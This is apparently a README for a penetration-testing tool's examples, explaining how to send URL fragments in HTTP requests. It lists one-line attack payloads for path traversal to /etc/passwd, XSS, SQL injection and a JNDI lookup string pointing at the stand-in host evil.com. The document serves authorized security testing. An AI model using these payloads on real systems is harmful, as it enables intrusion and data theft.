# Fragment Penetration Testing Examples

This directory contains examples demonstrating how to use fragments (#) in HTTP requests for penetration testing purposes.

## Fragment Test Files

### 1. fragment_test.json
Basic fragment testing example with simple GET request containing a fragment.
```bash
s2req -f examples/fragment_test.json -h http://target.com
```

### 2. fragment_injection_test.json
Advanced fragment injection testing with POST request, demonstrating:
- Fragment in URL path
- XSS payloads in query parameters
- SQL injection attempts in body
- Fragment references in form data

```bash
s2req -f examples/fragment_injection_test.json -h http://vulnerable-app.com
```

### 3. fragment_multi_test.yaml
Multiple request scenarios in YAML format:
- GET request with fragment in search endpoint
- POST request with fragment in form submission
- PUT request with fragment in API endpoint

```bash
s2req -f examples/fragment_multi_test.yaml -h http://api.target.com
```

### 4. fragment_fuzzing_test.json
Comprehensive fragment fuzzing test with dictionary-based payload injection:
- Path traversal attempts
- XSS payloads
- SQL injection
- JNDI injection
- URL encoded payloads

```bash
s2req -f examples/fragment_fuzzing_test.json -h http://test-app.com
```

## Fragment Testing Scenarios

### Common Fragment Attack Vectors

1. **Path Traversal**: `#../../etc/passwd`
2. **XSS Injection**: `#<script>alert('xss')</script>`
3. **SQL Injection**: `#' OR 1=1--`
4. **JNDI Injection**: `#${jndi:ldap://evil.com/a}`
5. **JavaScript Execution**: `#javascript:alert('fragment_xss')`
6. **Admin Access**: `#admin`, `#debug`, `#config`

### Usage Notes

- Fragments are normally not sent to servers in standard HTTP requests
- This tool specifically sends fragments to test server-side fragment handling
- Useful for testing applications that might process fragments server-side
- Can reveal hidden functionality or debug endpoints
- May expose sensitive information through fragment-based routing

### Security Testing Considerations

When using these examples:
1. Only test on systems you own or have explicit permission to test
2. Monitor server responses for error messages or unexpected behavior
3. Check for information disclosure in responses
4. Test different HTTP methods (GET, POST, PUT, DELETE)
5. Combine with other penetration testing techniques

### Example Output

When fragments are successfully sent to the server, you might see:
- Server processing fragment as part of the request path
- Different responses based on fragment content
- Error messages revealing server-side fragment handling
- Access to hidden or debug endpoints